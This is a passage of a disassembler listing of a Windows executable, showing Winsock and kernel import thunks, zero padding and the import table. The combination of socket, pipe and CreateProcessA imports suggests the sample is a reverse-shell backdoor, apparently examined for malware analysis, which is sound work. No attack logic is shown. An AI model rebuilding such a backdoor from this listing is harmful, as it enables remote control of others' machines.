        00401e64 40              ??         40h    @
        00401e65 00              ??         00h
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk uint __cdecl _controlfp(uint _NewValue, uint _Mask)
                               Thunked-Function: MSVCRT.DLL::_controlfp
                               assume FS_OFFSET = 0xffdff000
             uint              EAX:4          <RETURN>
             uint              Stack[0x4]:4   _NewValue
             uint              Stack[0x8]:4   _Mask
                             MSVCRT.DLL::_controlfp                          XREF[1]:     FUN_00401e44:00401e4e(c)
        00401e66 ff 25 7c        JMP        dword ptr [->MSVCRT.DLL::_controlfp]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk undefined Ordinal_19()
                               Thunked-Function: WS2_32.DLL::Ordinal_19
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
                             WS2_32.DLL::Ordinal_19                          XREF[1]:     FUN_00401320:00401507(c)
        00401e6c ff 25 f8        JMP        dword ptr [->WS2_32.DLL::Ordinal_19]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk undefined Ordinal_16()
                               Thunked-Function: WS2_32.DLL::Ordinal_16
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
                             WS2_32.DLL::Ordinal_16                          XREF[2]:     FUN_00401320:00401564(c),
                                                                                          FUN_00401320:004015c6(c)
        00401e72 ff 25 00        JMP        dword ptr [->WS2_32.DLL::Ordinal_16]
                 21 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk undefined Ordinal_4()
                               Thunked-Function: WS2_32.DLL::Ordinal_4
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
                             WS2_32.DLL::Ordinal_4                           XREF[1]:     FUN_00401320:00401466(c)
        00401e78 ff 25 ec        JMP        dword ptr [->WS2_32.DLL::Ordinal_4]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk undefined Ordinal_11()
                               Thunked-Function: WS2_32.DLL::Ordinal_11
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
                             WS2_32.DLL::Ordinal_11                          XREF[1]:     FUN_00401320:00401455(c)
        00401e7e ff 25 fc        JMP        dword ptr [->WS2_32.DLL::Ordinal_11]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk undefined Ordinal_9()
                               Thunked-Function: WS2_32.DLL::Ordinal_9
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
                             WS2_32.DLL::Ordinal_9                           XREF[1]:     FUN_00401320:00401446(c)
        00401e84 ff 25 e8        JMP        dword ptr [->WS2_32.DLL::Ordinal_9]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk undefined Ordinal_3()
                               Thunked-Function: WS2_32.DLL::Ordinal_3
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
                             WS2_32.DLL::Ordinal_3                           XREF[3]:     FUN_00401320:00401411(c),
                                                                                          FUN_00401320:00401471(c),
                                                                                          _StartAddress_004016f0:00401801(
        00401e8a ff 25 04        JMP        dword ptr [->WS2_32.DLL::Ordinal_3]
                 21 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk undefined Ordinal_23()
                               Thunked-Function: WS2_32.DLL::Ordinal_23
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
                             WS2_32.DLL::Ordinal_23                          XREF[1]:     FUN_00401320:00401404(c)
        00401e90 ff 25 f0        JMP        dword ptr [->WS2_32.DLL::Ordinal_23]
                 20 40 00
                             **************************************************************
                             *                       THUNK FUNCTION                       *
                             **************************************************************
                             thunk undefined Ordinal_115()
                               Thunked-Function: WS2_32.DLL::Ordinal_115
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
                             WS2_32.DLL::Ordinal_115                         XREF[1]:     FUN_00401320:004013fa(c)
        00401e96 ff 25 f4        JMP        dword ptr [->WS2_32.DLL::Ordinal_115]
                 20 40 00
        00401e9c cc              ??         CCh
        00401e9d cc              ??         CCh
        00401e9e cc              ??         CCh
        00401e9f cc              ??         CCh
        00401ea0 ff              ??         FFh
        00401ea1 25              ??         25h    %
        00401ea2 cc              ??         CCh                                              ?  ->  004020cc
        00401ea3 20              ??         20h
        00401ea4 40              ??         40h    @
        00401ea5 00              ??         00h
        00401ea6 00              ??         00h
        00401ea7 00              ??         00h
        00401ea8 00              ??         00h
        00401ea9 00              ??         00h
        00401eaa 00              ??         00h
        00401eab 00              ??         00h
        00401eac 00              ??         00h
        00401ead 00              ??         00h
        00401eae 00              ??         00h
        00401eaf 00              ??         00h
        00401eb0 00              ??         00h
        00401eb1 00              ??         00h
        00401eb2 00              ??         00h
        00401eb3 00              ??         00h
        00401eb4 00              ??         00h
        00401eb5 00              ??         00h
        00401eb6 00              ??         00h
        00401eb7 00              ??         00h
        00401eb8 00              ??         00h
        00401eb9 00              ??         00h
        00401eba 00              ??         00h
        00401ebb 00              ??         00h
        00401ebc 00              ??         00h
        00401ebd 00              ??         00h
        00401ebe 00              ??         00h
        00401ebf 00              ??         00h
        00401ec0 00              ??         00h
        00401ec1 00              ??         00h
        00401ec2 00              ??         00h
        00401ec3 00              ??         00h
        00401ec4 00              ??         00h
        00401ec5 00              ??         00h
        00401ec6 00              ??         00h
        00401ec7 00              ??         00h
        00401ec8 00              ??         00h
        00401ec9 00              ??         00h
        00401eca 00              ??         00h
        00401ecb 00              ??         00h
        00401ecc 00              ??         00h
        00401ecd 00              ??         00h
        00401ece 00              ??         00h
        00401ecf 00              ??         00h
        00401ed0 00              ??         00h
        00401ed1 00              ??         00h
        00401ed2 00              ??         00h
        00401ed3 00              ??         00h
        00401ed4 00              ??         00h
        00401ed5 00              ??         00h
        00401ed6 00              ??         00h
        00401ed7 00              ??         00h
        00401ed8 00              ??         00h
        00401ed9 00              ??         00h
        00401eda 00              ??         00h
        00401edb 00              ??         00h
        00401edc 00              ??         00h
        00401edd 00              ??         00h
        00401ede 00              ??         00h
        00401edf 00              ??         00h
        00401ee0 00              ??         00h
        00401ee1 00              ??         00h
        00401ee2 00              ??         00h
        00401ee3 00              ??         00h
        00401ee4 00              ??         00h
        00401ee5 00              ??         00h
        00401ee6 00              ??         00h
        00401ee7 00              ??         00h
        00401ee8 00              ??         00h
        00401ee9 00              ??         00h
        00401eea 00              ??         00h
        00401eeb 00              ??         00h
        00401eec 00              ??         00h
        00401eed 00              ??         00h
        00401eee 00              ??         00h
        00401eef 00              ??         00h
        00401ef0 00              ??         00h
        00401ef1 00              ??         00h
        00401ef2 00              ??         00h
        00401ef3 00              ??         00h
        00401ef4 00              ??         00h
        00401ef5 00              ??         00h
        00401ef6 00              ??         00h
        00401ef7 00              ??         00h
        00401ef8 00              ??         00h
        00401ef9 00              ??         00h
        00401efa 00              ??         00h
        00401efb 00              ??         00h
        00401efc 00              ??         00h
        00401efd 00              ??         00h
        00401efe 00              ??         00h
        00401eff 00              ??         00h
        00401f00 00              ??         00h
        00401f01 00              ??         00h
        00401f02 00              ??         00h
        00401f03 00              ??         00h
        00401f04 00              ??         00h
        00401f05 00              ??         00h
        00401f06 00              ??         00h
        00401f07 00              ??         00h
        00401f08 00              ??         00h
        00401f09 00              ??         00h
        00401f0a 00              ??         00h
        00401f0b 00              ??         00h
        00401f0c 00              ??         00h
        00401f0d 00              ??         00h
        00401f0e 00              ??         00h
        00401f0f 00              ??         00h
        00401f10 00              ??         00h
        00401f11 00              ??         00h
        00401f12 00              ??         00h
        00401f13 00              ??         00h
        00401f14 00              ??         00h
        00401f15 00              ??         00h
        00401f16 00              ??         00h
        00401f17 00              ??         00h
        00401f18 00              ??         00h
        00401f19 00              ??         00h
        00401f1a 00              ??         00h
        00401f1b 00              ??         00h
        00401f1c 00              ??         00h
        00401f1d 00              ??         00h
        00401f1e 00              ??         00h
        00401f1f 00              ??         00h
        00401f20 00              ??         00h
        00401f21 00              ??         00h
        00401f22 00              ??         00h
        00401f23 00              ??         00h
        00401f24 00              ??         00h
        00401f25 00              ??         00h
        00401f26 00              ??         00h
        00401f27 00              ??         00h
        00401f28 00              ??         00h
        00401f29 00              ??         00h
        00401f2a 00              ??         00h
        00401f2b 00              ??         00h
        00401f2c 00              ??         00h
        00401f2d 00              ??         00h
        00401f2e 00              ??         00h
        00401f2f 00              ??         00h
        00401f30 00              ??         00h
        00401f31 00              ??         00h
        00401f32 00              ??         00h
        00401f33 00              ??         00h
        00401f34 00              ??         00h
        00401f35 00              ??         00h
        00401f36 00              ??         00h
        00401f37 00              ??         00h
        00401f38 00              ??         00h
        00401f39 00              ??         00h
        00401f3a 00              ??         00h
        00401f3b 00              ??         00h
        00401f3c 00              ??         00h
        00401f3d 00              ??         00h
        00401f3e 00              ??         00h
        00401f3f 00              ??         00h
        00401f40 00              ??         00h
        00401f41 00              ??         00h
        00401f42 00              ??         00h
        00401f43 00              ??         00h
        00401f44 00              ??         00h
        00401f45 00              ??         00h
        00401f46 00              ??         00h
        00401f47 00              ??         00h
        00401f48 00              ??         00h
        00401f49 00              ??         00h
        00401f4a 00              ??         00h
        00401f4b 00              ??         00h
        00401f4c 00              ??         00h
        00401f4d 00              ??         00h
        00401f4e 00              ??         00h
        00401f4f 00              ??         00h
        00401f50 00              ??         00h
        00401f51 00              ??         00h
        00401f52 00              ??         00h
        00401f53 00              ??         00h
        00401f54 00              ??         00h
        00401f55 00              ??         00h
        00401f56 00              ??         00h
        00401f57 00              ??         00h
        00401f58 00              ??         00h
        00401f59 00              ??         00h
        00401f5a 00              ??         00h
        00401f5b 00              ??         00h
        00401f5c 00              ??         00h
        00401f5d 00              ??         00h
        00401f5e 00              ??         00h
        00401f5f 00              ??         00h
        00401f60 00              ??         00h
        00401f61 00              ??         00h
        00401f62 00              ??         00h
        00401f63 00              ??         00h
        00401f64 00              ??         00h
        00401f65 00              ??         00h
        00401f66 00              ??         00h
        00401f67 00              ??         00h
        00401f68 00              ??         00h
        00401f69 00              ??         00h
        00401f6a 00              ??         00h
        00401f6b 00              ??         00h
        00401f6c 00              ??         00h
        00401f6d 00              ??         00h
        00401f6e 00              ??         00h
        00401f6f 00              ??         00h
        00401f70 00              ??         00h
        00401f71 00              ??         00h
        00401f72 00              ??         00h
        00401f73 00              ??         00h
        00401f74 00              ??         00h
        00401f75 00              ??         00h
        00401f76 00              ??         00h
        00401f77 00              ??         00h
        00401f78 00              ??         00h
        00401f79 00              ??         00h
        00401f7a 00              ??         00h
        00401f7b 00              ??         00h
        00401f7c 00              ??         00h
        00401f7d 00              ??         00h
        00401f7e 00              ??         00h
        00401f7f 00              ??         00h
        00401f80 00              ??         00h
        00401f81 00              ??         00h
        00401f82 00              ??         00h
        00401f83 00              ??         00h
        00401f84 00              ??         00h
        00401f85 00              ??         00h
        00401f86 00              ??         00h
        00401f87 00              ??         00h
        00401f88 00              ??         00h
        00401f89 00              ??         00h
        00401f8a 00              ??         00h
        00401f8b 00              ??         00h
        00401f8c 00              ??         00h
        00401f8d 00              ??         00h
        00401f8e 00              ??         00h
        00401f8f 00              ??         00h
        00401f90 00              ??         00h
        00401f91 00              ??         00h
        00401f92 00              ??         00h
        00401f93 00              ??         00h
        00401f94 00              ??         00h
        00401f95 00              ??         00h
        00401f96 00              ??         00h
        00401f97 00              ??         00h
        00401f98 00              ??         00h
        00401f99 00              ??         00h
        00401f9a 00              ??         00h
        00401f9b 00              ??         00h
        00401f9c 00              ??         00h
        00401f9d 00              ??         00h
        00401f9e 00              ??         00h
        00401f9f 00              ??         00h
        00401fa0 00              ??         00h
        00401fa1 00              ??         00h
        00401fa2 00              ??         00h
        00401fa3 00              ??         00h
        00401fa4 00              ??         00h
        00401fa5 00              ??         00h
        00401fa6 00              ??         00h
        00401fa7 00              ??         00h
        00401fa8 00              ??         00h
        00401fa9 00              ??         00h
        00401faa 00              ??         00h
        00401fab 00              ??         00h
        00401fac 00              ??         00h
        00401fad 00              ??         00h
        00401fae 00              ??         00h
        00401faf 00              ??         00h
        00401fb0 00              ??         00h
        00401fb1 00              ??         00h
        00401fb2 00              ??         00h
        00401fb3 00              ??         00h
        00401fb4 00              ??         00h
        00401fb5 00              ??         00h
        00401fb6 00              ??         00h
        00401fb7 00              ??         00h
        00401fb8 00              ??         00h
        00401fb9 00              ??         00h
        00401fba 00              ??         00h
        00401fbb 00              ??         00h
        00401fbc 00              ??         00h
        00401fbd 00              ??         00h
        00401fbe 00              ??         00h
        00401fbf 00              ??         00h
        00401fc0 00              ??         00h
        00401fc1 00              ??         00h
        00401fc2 00              ??         00h
        00401fc3 00              ??         00h
        00401fc4 00              ??         00h
        00401fc5 00              ??         00h
        00401fc6 00              ??         00h
        00401fc7 00              ??         00h
        00401fc8 00              ??         00h
        00401fc9 00              ??         00h
        00401fca 00              ??         00h
        00401fcb 00              ??         00h
        00401fcc 00              ??         00h
        00401fcd 00              ??         00h
        00401fce 00              ??         00h
        00401fcf 00              ??         00h
        00401fd0 00              ??         00h
        00401fd1 00              ??         00h
        00401fd2 00              ??         00h
        00401fd3 00              ??         00h
        00401fd4 00              ??         00h
        00401fd5 00              ??         00h
        00401fd6 00              ??         00h
        00401fd7 00              ??         00h
        00401fd8 00              ??         00h
        00401fd9 00              ??         00h
        00401fda 00              ??         00h
        00401fdb 00              ??         00h
        00401fdc 00              ??         00h
        00401fdd 00              ??         00h
        00401fde 00              ??         00h
        00401fdf 00              ??         00h
        00401fe0 00              ??         00h
        00401fe1 00              ??         00h
        00401fe2 00              ??         00h
        00401fe3 00              ??         00h
        00401fe4 00              ??         00h
        00401fe5 00              ??         00h
        00401fe6 00              ??         00h
        00401fe7 00              ??         00h
        00401fe8 00              ??         00h
        00401fe9 00              ??         00h
        00401fea 00              ??         00h
        00401feb 00              ??         00h
        00401fec 00              ??         00h
        00401fed 00              ??         00h
        00401fee 00              ??         00h
        00401fef 00              ??         00h
        00401ff0 00              ??         00h
        00401ff1 00              ??         00h
        00401ff2 00              ??         00h
        00401ff3 00              ??         00h
        00401ff4 00              ??         00h
        00401ff5 00              ??         00h
        00401ff6 00              ??         00h
        00401ff7 00              ??         00h
        00401ff8 00              ??         00h
        00401ff9 00              ??         00h
        00401ffa 00              ??         00h
        00401ffb 00              ??         00h
        00401ffc 00              ??         00h
        00401ffd 00              ??         00h
        00401ffe 00              ??         00h
        00401fff 00              ??         00h
                             //
                             // .rdata
                             // ram:00402000-ram:004027ff
                             //
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall CloseHandle(HANDLE hObject)
             BOOL              EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hObject
             assume FS_OFFSET = <UNKNOWN>
                             46  CloseHandle  <<not bound>>
                             PTR_CloseHandle_00402000                        XREF[8]:     00400110(*), 004001b8(*),
                                                                                          0040020c(*),
                                                                                          FUN_004012c0:00401317(R),
                                                                                          FUN_00401600:00401677(R),
                                                                                          FUN_00401600:004016c4(R),
                                                                                          _StartAddress_004016f0:00401813(
                                                                                          FUN_00401860:00401923(R)
        00402000 e0 22 00 00     addr       KERNEL32.DLL::CloseHandle
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             DWORD __stdcall WaitForSingleObject(HANDLE hHandle, DWOR
             DWORD             EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hHandle
             DWORD             Stack[0x8]:4   dwMilliseconds
                             901  WaitForSingleObject  <<not bound>>
                             PTR_WaitForSingleObject_00402004                XREF[1]:     FUN_004012c0:0040130a(R)
        00402004 ee 22 00 00     addr       KERNEL32.DLL::WaitForSingleObject
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             HANDLE __stdcall CreateEventA(LPSECURITY_ATTRIBUTES lpEv
             HANDLE            EAX:4          <RETURN>
             LPSECURITY_ATT    Stack[0x4]:4   lpEventAttributes
             BOOL              Stack[0x8]:4   bManualReset
             BOOL              Stack[0xc]:4   bInitialState
             LPCSTR            Stack[0x10]:4  lpName
                             73  CreateEventA  <<not bound>>
                             PTR_CreateEventA_00402008                       XREF[1]:     FUN_004012c0:004012c1(R)
        00402008 04 23 00 00     addr       KERNEL32.DLL::CreateEventA
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             noreturn void __stdcall ExitThread(DWORD dwExitCode)
             void              <VOID>         <RETURN>
             DWORD             Stack[0x4]:4   dwExitCode
                             176  ExitThread  <<not bound>>
                             PTR_ExitThread_0040200c                         XREF[1]:     FUN_00401320:004015f0(R)
        0040200c 14 23 00 00     addr       KERNEL32.DLL::ExitThread
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             void __stdcall Sleep(DWORD dwMilliseconds)
             void              <VOID>         <RETURN>
             DWORD             Stack[0x4]:4   dwMilliseconds
                             841  Sleep  <<not bound>>
                             PTR_Sleep_00402010                              XREF[1]:     FUN_00401320:0040141b(R)
        00402010 22 23 00 00     addr       KERNEL32.DLL::Sleep
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall GetComputerNameA(LPSTR lpBuffer, LPDWORD
             BOOL              EAX:4          <RETURN>
             LPSTR             Stack[0x4]:4   lpBuffer
             LPDWORD           Stack[0x8]:4   nSize
                             268  GetComputerNameA  <<not bound>>
                             PTR_GetComputerNameA_00402014                   XREF[1]:     FUN_00401320:004013cf(R)
        00402014 2a 23 00 00     addr       KERNEL32.DLL::GetComputerNameA
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall CreatePipe(PHANDLE hReadPipe, PHANDLE hWr
             BOOL              EAX:4          <RETURN>
             PHANDLE           Stack[0x4]:4   hReadPipe
             PHANDLE           Stack[0x8]:4   hWritePipe
             LPSECURITY_ATT    Stack[0xc]:4   lpPipeAttributes
             DWORD             Stack[0x10]:4  nSize
                             95  CreatePipe  <<not bound>>
                             PTR_CreatePipe_00402018                         XREF[1]:     FUN_00401600:0040161d(R)
        00402018 3e 23 00 00     addr       KERNEL32.DLL::CreatePipe
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall DisconnectNamedPipe(HANDLE hNamedPipe)
             BOOL              EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hNamedPipe
                             133  DisconnectNamedPipe  <<not bound>>
                             PTR_DisconnectNamedPipe_0040201c                XREF[1]:     _StartAddress_004016f0:00401808(
        0040201c 4c 23 00 00     addr       KERNEL32.DLL::DisconnectNamedPipe
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall TerminateProcess(HANDLE hProcess, UINT uE
             BOOL              EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hProcess
             UINT              Stack[0x8]:4   uExitCode
                             849  TerminateProcess  <<not bound>>
                             PTR_TerminateProcess_00402020                   XREF[1]:     _StartAddress_004016f0:004017f6(
        00402020 62 23 00 00     addr       KERNEL32.DLL::TerminateProcess
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             DWORD __stdcall WaitForMultipleObjects(DWORD nCount, HAN
             DWORD             EAX:4          <RETURN>
             DWORD             Stack[0x4]:4   nCount
             HANDLE *          Stack[0x8]:4   lpHandles
             BOOL              Stack[0xc]:4   bWaitAll
             DWORD             Stack[0x10]:4  dwMilliseconds
                             899  WaitForMultipleObjects  <<not bound>>
                             PTR_WaitForMultipleObjects_00402024             XREF[1]:     _StartAddress_004016f0:004017a7(
        00402024 76 23 00 00     addr       KERNEL32.DLL::WaitForMultipleObjects
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall TerminateThread(HANDLE hThread, DWORD dwE
             BOOL              EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hThread
             DWORD             Stack[0x8]:4   dwExitCode
                             850  TerminateThread  <<not bound>>
                             PTR_TerminateThread_00402028                    XREF[4]:     _StartAddress_004016f0:0040177b(
                                                                                          _StartAddress_004016f0:004017bb(
                                                                                          _StartAddress_004016f0:004017d6(
                                                                                          _StartAddress_004016f0:004017ea(
        00402028 90 23 00 00     addr       KERNEL32.DLL::TerminateThread
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpTh
             HANDLE            EAX:4          <RETURN>
             LPSECURITY_ATT    Stack[0x4]:4   lpThreadAttributes
             SIZE_T            Stack[0x8]:4   dwStackSize
             LPTHREAD_START    Stack[0xc]:4   lpStartAddress
             LPVOID            Stack[0x10]:4  lpParameter
             DWORD             Stack[0x14]:4  dwCreationFlags
             LPDWORD           Stack[0x18]:4  lpThreadId
                             105  CreateThread  <<not bound>>
                             PTR_CreateThread_0040202c                       XREF[1]:     _StartAddress_004016f0:00401704(
        0040202c a2 23 00 00     addr       KERNEL32.DLL::CreateThread
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall CreateProcessA(LPCSTR lpApplicationName,
             BOOL              EAX:4          <RETURN>
             LPCSTR            Stack[0x4]:4   lpApplicationName
             LPSTR             Stack[0x8]:4   lpCommandLine
             LPSECURITY_ATT    Stack[0xc]:4   lpProcessAttributes
             LPSECURITY_ATT    Stack[0x10]:4  lpThreadAttributes
             BOOL              Stack[0x14]:4  bInheritHandles
             DWORD             Stack[0x18]:4  dwCreationFlags
             LPVOID            Stack[0x1c]:4  lpEnvironment
             LPCSTR            Stack[0x20]:4  lpCurrentDirectory
             LPSTARTUPINFOA    Stack[0x24]:4  lpStartupInfo
             LPPROCESS_INFO    Stack[0x28]:4  lpProcessInformation
                             96  CreateProcessA  <<not bound>>
                             PTR_CreateProcessA_00402030                     XREF[1]:     FUN_00401860:00401910(R)
        00402030 b2 23 00 00     addr       KERNEL32.DLL::CreateProcessA
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall DuplicateHandle(HANDLE hSourceProcessHand
             BOOL              EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hSourceProcessHandle
             HANDLE            Stack[0x8]:4   hSourceHandle
             HANDLE            Stack[0xc]:4   hTargetProcessHandle
             LPHANDLE          Stack[0x10]:4  lpTargetHandle
             DWORD             Stack[0x14]:4  dwDesiredAccess
             BOOL              Stack[0x18]:4  bInheritHandle
             DWORD             Stack[0x1c]:4  dwOptions
                             140  DuplicateHandle  <<not bound>>
                             PTR_DuplicateHandle_00402034                    XREF[1]:     FUN_00401860:004018cd(R)
        00402034 c4 23 00 00     addr       KERNEL32.DLL::DuplicateHandle
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             HANDLE __stdcall GetCurrentProcess(void)
             HANDLE            EAX:4          <RETURN>
                             314  GetCurrentProcess  <<not bound>>
                             PTR_GetCurrentProcess_00402038                  XREF[2]:     FUN_00401860:00401870(R),
                                                                                          FUN_00401b50:00401c03(R)
        00402038 d6 23 00 00     addr       KERNEL32.DLL::GetCurrentProcess
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall ReadFile(HANDLE hFile, LPVOID lpBuffer, D
             BOOL              EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hFile
             LPVOID            Stack[0x8]:4   lpBuffer
             DWORD             Stack[0xc]:4   nNumberOfBytesToRead
             LPDWORD           Stack[0x10]:4  lpNumberOfBytesRead
             LPOVERLAPPED      Stack[0x14]:4  lpOverlapped
                             683  ReadFile  <<not bound>>
        0040203c ea 23 00 00     addr       KERNEL32.DLL::ReadFile
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall PeekNamedPipe(HANDLE hNamedPipe, LPVOID l
             BOOL              EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hNamedPipe
             LPVOID            Stack[0x8]:4   lpBuffer
             DWORD             Stack[0xc]:4   nBufferSize
             LPDWORD           Stack[0x10]:4  lpBytesRead
             LPDWORD           Stack[0x14]:4  lpTotalBytesAvail
             LPDWORD           Stack[0x18]:4  lpBytesLeftThisMessage
                             647  PeekNamedPipe  <<not bound>>
        00402040 f6 23 00 00     addr       KERNEL32.DLL::PeekNamedPipe
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall SetEvent(HANDLE hEvent)
             BOOL              EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hEvent
                             779  SetEvent  <<not bound>>
        00402044 06 24 00 00     addr       KERNEL32.DLL::SetEvent
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer,
             BOOL              EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hFile
             LPCVOID           Stack[0x8]:4   lpBuffer
             DWORD             Stack[0xc]:4   nNumberOfBytesToWrite
             LPDWORD           Stack[0x10]:4  lpNumberOfBytesWritten
             LPOVERLAPPED      Stack[0x14]:4  lpOverlapped
                             919  WriteFile  <<not bound>>
        00402048 12 24 00 00     addr       KERNEL32.DLL::WriteFile
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall SetProcessPriorityBoost(HANDLE hProcess,
             BOOL              EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hProcess
             BOOL              Stack[0x8]:4   bDisablePriorityBoost
                             808  SetProcessPriorityBoost  <<not bound>>
                             PTR_SetProcessPriorityBoost_0040204c            XREF[1]:     FUN_00401b50:00401c6b(R)
        0040204c 1e 24 00 00     addr       KERNEL32.DLL::SetProcessPriorityBoost
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall SetThreadPriority(HANDLE hThread, int nPr
             BOOL              EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hThread
             int               Stack[0x8]:4   nPriority
                             824  SetThreadPriority  <<not bound>>
                             PTR_SetThreadPriority_00402050                  XREF[1]:     FUN_00401b50:00401c43(R)
        00402050 38 24 00 00     addr       KERNEL32.DLL::SetThreadPriority
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             HANDLE __stdcall GetCurrentThread(void)
             HANDLE            EAX:4          <RETURN>
                             317  GetCurrentThread  <<not bound>>
                             PTR_GetCurrentThread_00402054                   XREF[1]:     FUN_00401b50:00401c39(R)
        00402054 4c 24 00 00     addr       KERNEL32.DLL::GetCurrentThread
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             BOOL __stdcall SetPriorityClass(HANDLE hProcess, DWORD d
             BOOL              EAX:4          <RETURN>
             HANDLE            Stack[0x4]:4   hProcess
             DWORD             Stack[0x8]:4   dwPriorityClass
                             806  SetPriorityClass  <<not bound>>
                             PTR_SetPriorityClass_00402058                   XREF[1]:     FUN_00401b50:00401c30(R)
        00402058 60 24 00 00     addr       KERNEL32.DLL::SetPriorityClass
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             LPSTR __stdcall lstrcatA(LPSTR lpString1, LPCSTR lpStrin
             LPSTR             EAX:4          <RETURN>
             LPSTR             Stack[0x4]:4   lpString1
             LPCSTR            Stack[0x8]:4   lpString2
                             944  lstrcatA  <<not bound>>
                             PTR_lstrcatA_0040205c                           XREF[1]:     FUN_00401b50:00401bc5(R)
        0040205c 74 24 00 00     addr       KERNEL32.DLL::lstrcatA
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             LPSTR __stdcall lstrcpyA(LPSTR lpString1, LPCSTR lpStrin
             LPSTR             EAX:4          <RETURN>
             LPSTR             Stack[0x4]:4   lpString1
             LPCSTR            Stack[0x8]:4   lpString2
                             953  lstrcpyA  <<not bound>>
                             PTR_lstrcpyA_00402060                           XREF[1]:     FUN_00401b50:00401bbf(R)
        00402060 80 24 00 00     addr       KERNEL32.DLL::lstrcpyA
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             DWORD __stdcall GetEnvironmentVariableA(LPCSTR lpName, L
             DWORD             EAX:4          <RETURN>
             LPCSTR            Stack[0x4]:4   lpName
             LPSTR             Stack[0x8]:4   lpBuffer
             DWORD             Stack[0xc]:4   nSize
                             336  GetEnvironmentVariableA  <<not bound>>
                             PTR_GetEnvironmentVariableA_00402064            XREF[1]:     FUN_00401b50:00401ba4(R)
        00402064 8c 24 00 00     addr       KERNEL32.DLL::GetEnvironmentVariableA
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             DWORD __stdcall GetShortPathNameA(LPCSTR lpszLongPath, L
             DWORD             EAX:4          <RETURN>
             LPCSTR            Stack[0x4]:4   lpszLongPath
             LPSTR             Stack[0x8]:4   lpszShortPath
             DWORD             Stack[0xc]:4   cchBuffer
                             429  GetShortPathNameA  <<not bound>>
                             PTR_GetShortPathNameA_00402068                  XREF[1]:     FUN_00401b50:00401b84(R)
        00402068 a6 24 00 00     addr       KERNEL32.DLL::GetShortPathNameA
                             **************************************************************
                             *                POINTER to EXTERNAL FUNCTION                *
                             **************************************************************
                             DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPST
